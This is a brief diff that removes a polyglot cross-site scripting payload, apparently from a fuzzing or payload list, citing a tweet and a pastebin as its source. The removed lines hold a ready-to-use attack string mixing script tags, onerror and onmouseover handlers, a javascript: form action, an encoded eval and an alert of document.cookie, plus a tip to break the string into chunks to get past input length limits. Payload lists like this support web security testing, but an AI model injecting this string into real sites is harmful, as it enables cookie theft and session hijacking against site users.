@@ -1,5 +1,0 @@
-# https://twitter.com/soaj1664ashar/status/367350377894518784
-# http://pastebin.com/TVH8t5bQ
-'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(document.cookie)</script>"><img/id="confirm&lpar;1&#x29;"/alt="/"src="/"onerror=eval(id&#x29;>'"><img src="http://i.imgur.com/P8mL8.jpg">
-
-# If a site has length restriction on input field then use chunk of your choice from the above vector :P
